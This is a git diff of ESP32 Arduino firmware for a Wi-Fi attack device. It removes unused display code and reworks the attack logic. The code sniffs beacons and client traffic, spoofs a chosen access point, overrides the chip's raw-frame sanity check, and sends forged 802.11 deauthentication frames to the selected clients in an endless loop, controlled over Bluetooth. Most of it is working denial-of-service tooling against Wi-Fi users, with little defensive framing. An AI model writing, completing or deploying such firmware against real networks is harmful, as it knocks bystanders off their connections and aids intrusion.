@@ -1,12 +1,11 @@
 #include <Arduino.h>
-#include "lvgl.h"      /* https://github.com/lvgl/lvgl.git */
-#include "rm67162.h"
 #include "esp_wifi.h"
 #include "esp_mac.h"
 #include <beaconFrame.h>
 #include <apInfo.h>
 #include <BLEControl.h>
 #include "esp_event.h"
+#include "esp_wifi_types.h"
 
 
 #if ARDUINO_USB_CDC_ON_BOOT != 1
@@ -26,16 +25,11 @@
     https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser
 
     Figure out why ap callback function crashed when accessing event data
+    detect if device is connected to my ap before deauthing
 */
 
 //configure AP
 int switchChan = 0;
-
-static lv_style_t clock_obj_style;
-static lv_style_t sep_style;
-lv_color_t blue = lv_color_hex(0x6f8bc6);
-lv_color_t darkBlue = lv_color_hex(0x2e3440);
-lv_color_t shadow = lv_color_hex(0x2f333d);
 
 const uint8_t BEACON = 128; //First byte in frame that determins beacon subtype
 
@@ -57,7 +51,6 @@ wifi_promiscuous_filter_t filter;
 uint8_t deauthClients[50][6]; //Store client mac addresses
 int numDeauthClients = 0;
 int selectedApNum = -1; //If value is -1, an ap has not been selected
-int spoofAll; //determines if deauth packet is send to broadcast address or specific clients
 static EventGroupHandle_t apEventGroup; //handle ap events
 
 static const uint8_t rawDeauthFrame[] = {
@@ -70,22 +63,18 @@ static const uint8_t rawDeauthFrame[] = {
     0x02, 0x00 //reason code (authentication no longer valid)
 };
 
-void configStyle() {
-    lv_style_init(&clock_obj_style);
-    lv_style_set_border_color(&clock_obj_style, blue);
-    lv_style_set_border_width(&clock_obj_style, 2);
-    lv_style_set_bg_color(&clock_obj_style, darkBlue);
-    lv_style_set_shadow_width(&clock_obj_style, 10);
-    lv_style_set_shadow_color(&clock_obj_style, shadow);
-    lv_style_set_text_font(&clock_obj_style, &lv_font_montserrat_48);
 
-    lv_style_remove_prop(&clock_obj_style, LV_STYLE_BORDER_COLOR);
+void sendMsg(char msg[]) {
+    bleTerm.pTxCharacteristic->setValue(msg);
+    bleTerm.pTxCharacteristic->notify();
+    delay(10);
 }
 
 
-void configSepStyle() {
-    lv_style_init(&sep_style);
-    lv_style_set_text_font(&sep_style, &lv_font_montserrat_48);
+void sendMsg(const char *msg) {
+    bleTerm.pTxCharacteristic->setValue(msg);
+    bleTerm.pTxCharacteristic->notify();
+    delay(10);
 }
 
 
@@ -118,7 +107,7 @@ void parseBeacon(wifi_promiscuous_pkt_t *mgmtPacket, signed rssi, uint8_t channe
         Serial.println();
         //Store ssid, bssid, and rssi to spoof later
         if(apInfo.addAP(ssid, bssid, rssi, channel, ssidLen)) {
-            //WebSerial.println("Access Point Found.");
+            sendMsg("Access Point Found.");
         }
     }
     Serial.println();
@@ -154,15 +143,14 @@ void wifiCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
                 parseBeacon(mgmtPacket, rssi, channel);
             }
             break;
+        case WIFI_PKT_CTRL:
+            Serial.println("ctrl packet");
         case WIFI_PKT_DATA:
             Serial.print("Data pkt first byte: ");
             if(mgmtPacket->payload[0] != 200) {
                 Serial.println("Data pkt");
                 scanForClient(mgmtPacket);
             }
-            break;
-        case WIFI_PKT_CTRL:
-            Serial.println("ctrl packet");
             break;
     }
 }
@@ -191,17 +179,6 @@ int configWifi() {
 }
 
 
-void my_disp_flush(lv_disp_drv_t *disp,
-                const lv_area_t *area,
-                lv_color_t *color_p)
-{
-    uint32_t w = (area->x2 - area->x1 + 1);
-    uint32_t h = (area->y2 - area->y1 + 1);
-    lcd_PushColors(area->x1, area->y1, w, h, (uint16_t*)&color_p->full);
-    lv_disp_flush_ready(disp);
-}
-
-
 void configurePromisc(int filterMask) {
     esp_wifi_set_promiscuous(false);
 
@@ -210,7 +187,7 @@ void configurePromisc(int filterMask) {
             filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
             break;
         case 1:
-            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
+            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA;
             break;
     }
     esp_wifi_set_promiscuous_filter(&filter);
@@ -220,19 +197,6 @@ void configurePromisc(int filterMask) {
             delay(500);
         }
     }
-}
-
-void sendMsg(char msg[]) {
-    bleTerm.pTxCharacteristic->setValue(msg);
-    bleTerm.pTxCharacteristic->notify();
-    delay(10);
-}
-
-
-void sendMsg(const char *msg) {
-    bleTerm.pTxCharacteristic->setValue(msg);
-    bleTerm.pTxCharacteristic->notify();
-    delay(10);
 }
 
 
@@ -247,18 +211,12 @@ void printSSIDWeb() {
     int num = apInfo.getNumAP();
     uint8_t **ssidList = apInfo.getSSID();
 
-    //WebSerial.println("---AP List---");
-    //char msg[] = "---AP List---";
     sendMsg("---AP List---");
     int totalLen = apInfo.SSID_LEN;
     if(num > 0) {
         char apMsg[40];
         memset(apMsg, '\0', 40);
         for(int i = 0; i < num; i++) {
-            //apMsg[0] = i+49; //Convert to ascii number so it prints properly
-            //apMsg[1] = '.';
-            //apMsg[2] = 20; //space character
-
             //max length of ssid
             int ssidLen = apInfo.getSSIDLen(i);
 
@@ -432,19 +390,12 @@ void selectAllDeauthClients() {
 
 void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     Serial.println("AP cb called");
-    if(event_id == WIFI_EVENT_AP_STACONNECTED) {
+    if(event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
         Serial.println("AP_CONNETed event");
         wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t*) event_data;
         char message[50];
-        snprintf(message, 50, "Station %s Connected.\n", MAC2STR(event->mac));
-        sendMsg(message);
-    }
-    else if(event_id == WIFI_EVENT_AP_STADISCONNECTED) {
-        Serial.println("AP_disCONNETed event");
-        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t*) event_data;
-        char message[50];
-        /*
-        snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x: Disconnected.\n", event->mac[0], 
+        //snprintf(message, 50, "Station %s Connected.\n", MAC2STR(event->mac));
+        snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x Connected.\n", event->mac[0], 
                                                                             event->mac[1],
                                                                             event->mac[2],
                                                                             event->mac[3],
@@ -452,8 +403,20 @@ void ap_event_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void 
                                                                             event->mac[5]
                                                                             );
         sendMsg(message);
-        */
-        sendMsg("Disconnect Eevnt");
+    }
+    else if(event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
+        Serial.println("AP_disCONNETed event");
+        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t*) event_data;
+        char message[50];
+        snprintf(message, 50, "Station %x:%x:%x:%x:%x:%x Disconnected.\n", event->mac[0], 
+                                                                            event->mac[1],
+                                                                            event->mac[2],
+                                                                            event->mac[3],
+                                                                            event->mac[4],
+                                                                            event->mac[5]
+                                                                            );
+        sendMsg(message);
+        //sendMsg("Disconnect Eevnt");
     }
 }
 
@@ -465,6 +428,7 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 
 
 void startAPSpoof() {
+    esp_wifi_set_promiscuous(false);
     esp_event_loop_create_default();
     apEventGroup = xEventGroupCreate();
     esp_event_handler_instance_register(
@@ -491,35 +455,22 @@ void startAPSpoof() {
     int clientCount = apInfo.getClientCount(selectedApNum);
 
     Serial.println("Startung deauth test");
-    switch(spoofAll) {
-        case 0:
-            for(int i = 0; i < numDeauthClients; i++) {
-                Serial.printf("Selecting client %i\n", i);
-                memcpy(&deauthFrame[4], deauthClients[i], 6);
-                esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
-                delay(10);
+    while(true) {
+        for(int i = 0; i < numDeauthClients; i++) {
+            memcpy(&deauthFrame[4], deauthClients[i], 6);
+            esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
+            delay(10);
 
-                if(i == clientCount-1) {
-                    i = -1;
-                }
+            if(i == clientCount-1) {
+                i = -1;
             }
-            break;
-        case 1:
-            while(true) {
-                esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
-                delay(10);
-            }
-            break;
+        }
     }
 }
 
 
 void setup()
 {
-    //static lv_disp_drv_t disp_drv;
-    
-    //static lv_disp_draw_buf_t draw_buf;
-    //static lv_color_t *buf;
     Serial.begin(115200);
     //Serup wifi access point
     Serial.println("Setting up Config Access Point");
@@ -540,77 +491,6 @@ void setup()
     }
     Serial.println("Starting bluetooth");
     setupBLE(bleTerm);
-    ////bleTerm.begin();
-
-    //Setup serial webpage
-    //WebSerial.begin(&Server);
-    //WebSerial.msgCallback(recvMsg);
-    //Server.begin();
-    //Serial.print("IP Address: ");
-    //Serial.println(WiFi.softAPIP());
-
-    //rm67162_init(); // amoled lcd initialization
-
-    //lcd_setRotation(1);
-
-    //lv_init();
-    /*
-
-    buf = (lv_color_t *)ps_malloc(sizeof(lv_color_t) * LVGL_LCD_BUF_SIZE);
-    assert(buf);
-
-    lv_disp_drv_init(&disp_drv);
-    //Sets resolution
-    disp_drv.hor_res = EXAMPLE_LCD_H_RES;
-    disp_drv.ver_res = EXAMPLE_LCD_V_RES;
-    lv_disp_draw_buf_init(&draw_buf, buf, NULL, LVGL_LCD_BUF_SIZE);
-    //Implement function that can copy an image to the display
-    disp_drv.flush_cb = my_disp_flush;
-    disp_drv.draw_buf = &draw_buf;
-    lv_disp_drv_register(&disp_drv);
-
-    short int sepWidth = 30;
-    short int numWidth = ((EXAMPLE_LCD_H_RES - sepWidth) / 2) - 30;
-    short int contHeight = EXAMPLE_LCD_V_RES - 35;
-
-    static lv_coord_t column_dsc[] = {numWidth, sepWidth, numWidth, LV_GRID_TEMPLATE_LAST}; //3 100 px wide columns
-    static lv_coord_t row_dsc[] = {contHeight, LV_GRID_TEMPLATE_LAST}; // 1 100 pixel tall row
-
-    //Create objects to be used
-    lv_obj_t *grid = lv_obj_create(lv_scr_act());
-    
-    lv_obj_t *hourCont = lv_obj_create(grid);
-    lv_obj_t *minuteCont = lv_obj_create(grid);
-
-    lv_obj_t *hour = lv_label_create(hourCont);
-    lv_obj_t *seperator = lv_label_create(grid);
-    lv_obj_t *minute = lv_label_create(minuteCont);
-    
-    lv_obj_set_style_grid_column_dsc_array(grid, column_dsc, 0);
-    lv_obj_set_style_grid_row_dsc_array(grid, row_dsc, 0);
-    lv_obj_set_size(grid, EXAMPLE_LCD_H_RES, EXAMPLE_LCD_V_RES);
-    lv_obj_center(grid);
-    lv_obj_set_layout(grid, LV_LAYOUT_GRID);
-    lv_obj_set_align(grid, LV_ALIGN_CENTER);
-
-    lv_obj_set_grid_cell(hourCont, LV_GRID_ALIGN_STRETCH, 0, 1, LV_GRID_ALIGN_STRETCH, 0, 1);
-    lv_obj_set_grid_cell(seperator, LV_GRID_ALIGN_CENTER, 1, 1, LV_GRID_ALIGN_CENTER, 0, 1);
-    lv_obj_set_grid_cell(minuteCont, LV_GRID_ALIGN_STRETCH, 2, 1, LV_GRID_ALIGN_STRETCH, 0, 1);
-
-    lv_label_set_text_fmt(hour, "test");
-    lv_label_set_text_fmt(seperator, ":");
-    lv_label_set_text_fmt(minute, "minute");
-
-    lv_obj_center(minute);
-    lv_obj_center(seperator);
-    lv_obj_center(hour);
-    configStyle();
-    configSepStyle();
-    lv_obj_add_style(hourCont, &clock_obj_style, LV_PART_MAIN);
-    lv_obj_add_style(minuteCont, &clock_obj_style, LV_PART_MAIN);
-    lv_obj_add_style(seperator, &sep_style, LV_PART_MAIN);
-    Serial.println("Display initialized");
-    */
 }
 
 
@@ -680,7 +560,6 @@ void configState() {
             case 7: { //select client
                 if(selectedApNum != -1) {
                     sendMsg("Adding selected clients");
-                    spoofAll = 0;
                     selectDeauthClients();
                 }
                 else {
@@ -690,7 +569,6 @@ void configState() {
             }
             case 8: { //select all clients
                 if(selectedApNum != -1) {
-                    spoofAll = 1;
                     sendMsg("Selecting all clients");
                     selectAllDeauthClients();
                 }
@@ -762,6 +640,5 @@ void loop()
                 curTime = millis();
             }
     }
-    //lv_timer_handler();
     delay(500);
 }
